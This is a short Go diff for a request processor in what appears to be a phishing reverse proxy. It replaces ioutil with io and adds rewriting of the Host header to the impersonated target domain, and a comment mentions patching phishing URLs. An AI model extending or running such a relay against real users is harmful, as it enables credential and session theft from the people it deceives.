@@ -2,7 +2,6 @@ package main
 
 import (
 	"io"
-	"io/ioutil"
 	"net/http"
 	"net/url"
 	"strings"
@@ -36,7 +35,7 @@ func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
 	var body io.ReadCloser
 	stream := c.Context().RequestBodyStream()
 	if stream != nil {
-		body = ioutil.NopCloser(stream)
+		body = io.NopCloser(stream)
 	}
 	// TODO patch phishing URLs in body with original domains
 	req := &http.Request{
@@ -64,6 +63,10 @@ func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
 	origin := req.Header["Origin"]
 	if len(origin) > 0 {
 		req.Header["Origin"] = []string{p.conv.ToTargetURL(origin[0])}
+	}
+	host := req.Header["Host"]
+	if len(host) > 0 {
+		req.Header["Host"] = []string{p.conv.ToTargetDomain(host[0])}
 	}
 	referer := req.Header["Referer"]
 	if len(referer) > 0 {
